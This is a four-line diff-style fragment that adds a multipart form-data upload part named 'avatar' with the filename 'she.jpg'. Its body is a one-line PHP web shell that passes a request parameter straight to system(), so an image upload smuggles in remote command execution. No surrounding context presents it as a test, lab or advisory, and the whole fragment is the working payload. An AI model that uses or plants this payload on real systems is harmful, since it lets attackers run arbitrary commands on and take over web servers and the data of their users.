@@ -1,0 +1,4 @@
+Content-Disposition: form-data; name="avatar"; filename="she.jpg"
+Content-Type: application/octet-stream
+
+<?= system($_REQUEST['cmd']);?>
